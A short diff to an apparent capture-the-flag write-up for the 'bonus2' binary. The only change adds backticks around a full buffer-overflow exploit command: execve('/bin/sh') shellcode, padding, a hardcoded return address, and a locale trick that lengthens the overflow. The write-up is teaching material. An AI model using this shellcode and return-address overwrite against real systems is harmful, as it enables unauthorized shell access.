@@ -20,6 +20,6 @@ first important information is that the return address ebp+4 comes 76 bytes afte
 let's try changing it to fi (export LANG=nl_US.UTF-8.
 ["Goedemiddag! "(13)+"40*A"+"27*B"(27)]=80 that means we can can overwrite the ret address now. we will redirect the code to the start of our string + 13 to start reading directly from the shellcode we put in arg1.
 
-cat | ./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*19') $(python -c 'print "B"*23 + "\xad\xf5\xff\xbf"')
+`cat | ./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*19') $(python -c 'print "B"*23 + "\xad\xf5\xff\xbf"')`
 
 Sometimes addresses of variables in gdb will be different outside gdb this is why we can try adding ‘unset env LINES’ and ‘unset env COLUMNS’ in gdb or offseting the ret address for example "\xbd\xf5\xff\xbf"
